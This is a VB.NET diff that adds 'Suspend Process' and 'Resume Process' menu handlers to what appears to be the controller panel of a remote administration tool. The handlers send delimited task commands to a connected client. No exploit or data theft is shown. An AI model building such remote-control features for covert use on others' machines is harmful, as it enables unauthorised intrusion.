@@ -64,4 +64,28 @@
         Await Task.Run(Sub() SenderHelper.SenderHelper(Form1.CliSt, Label4.Text, o))
 
     End Sub
+
+    Private Async Sub SuspendProcessToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SuspendProcessToolStripMenuItem.Click
+        If ListView1.SelectedItems.Count = 1 Then
+
+
+
+            Dim o As String = Form1.PL_TASKS & "|SP1|" & "" & "|SP2|" & "|SUS|" & "|SP2|" & ListView1.SelectedItems(0).Text & "|ENDING|"
+
+            Await Task.Run(Sub() SenderHelper.SenderHelper(Form1.CliSt, Label4.Text, o))
+
+        End If
+    End Sub
+
+    Private Async Sub ResumeProcessToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ResumeProcessToolStripMenuItem.Click
+        If ListView1.SelectedItems.Count = 1 Then
+
+
+
+            Dim o As String = Form1.PL_TASKS & "|SP1|" & "" & "|SP2|" & "|WAKEUP|" & "|SP2|" & ListView1.SelectedItems(0).Text & "|ENDING|"
+
+            Await Task.Run(Sub() SenderHelper.SenderHelper(Form1.CliSt, Label4.Text, o))
+
+        End If
+    End Sub
 End Class
